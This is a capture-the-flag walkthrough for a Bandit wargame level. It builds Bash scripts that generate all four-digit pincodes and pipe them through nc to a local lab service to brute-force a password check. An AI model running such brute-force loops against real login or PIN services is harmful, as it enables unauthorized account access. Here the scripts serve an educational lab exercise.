The service running on port *30002* can be accessed using `nc`:
```bash
nc localhost 30002
#output:
#I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode 
#on a single line, separated by a space.
```
## Generating All Possible Pincodes
A **loop** is a control structure that repeatedly executes a block of commands until a defined condition is met. Loops are commonly used in scripting to automate repetitive tasks such as iterating through lists, files, or numerical ranges.  
A **`for` loop** iterates over a sequence of values and executes a block of commands for each value in that sequence.
```bash
for variable in sequence
do
    commands
done
```
A Bash script that uses a loop can be used to generate every pincode together with the known password. 
```bash
vi pincode_generator.sh
```
Script contents:
```bash
#!/bin/bash

for i in $(seq -w 0 9999) #the "-w" option ensures fixed width with leading zeros, which is required for valid pincodes, therefore generating numbers from 0000 to 9999

do 
        echo *bandit24password* $i >> pincode_possibilities.txt #writes the password together with the current pincode
done
```
In Bash, the `>>` operator is used to append output to a file. This operator differs from `>`:  
• `>` - overwrites the file's contents  
• `>>` - appends new content to the end of the file without removing existing data  
## Sending Attempts to the Service
Sending the entire file directly to the service does not produce usable feedback because the daemon processes input sequentially. Instead, each line should be transmitted individually.  
A second script can be used to read each line from the generated file and send it to the service:
```bash
vi print_possibilities.sh
```
Script contents:
```bash
#!/bin/bash

while read line #reads each line from "pincode_possibilities.txt"
do 
        echo $line #outputs the current password-pincode pair
done < pincode_possibilities.txt | nc localhost 30002 >> possibilities_output.txt
```
Explanation:  
• `|` - forwards the output to nc  
• `nc` - localhost 30002 sends each attempt to the pincode service  
• `>>` - possibilities_output.txt stores all responses for later analysis    
Make the script executable and run it:
```bash
chmod +x print_possibilities.sh
./print_possibilities.sh
```
## OPTIONAL - Identifying the Correct Pincode

To locate the successful attempt, search for the word *Correct* in the output file:
```bash
grep -n "Correct" possibilities_output.txt #"-n" flag prints the line number where the match occurs.
```
The first line of the output file contains the daemon's initial message, and the brute-force attempts start afterward. Adjusting for this offset reveals that the correct pincode corresponds to the number two units smaller.
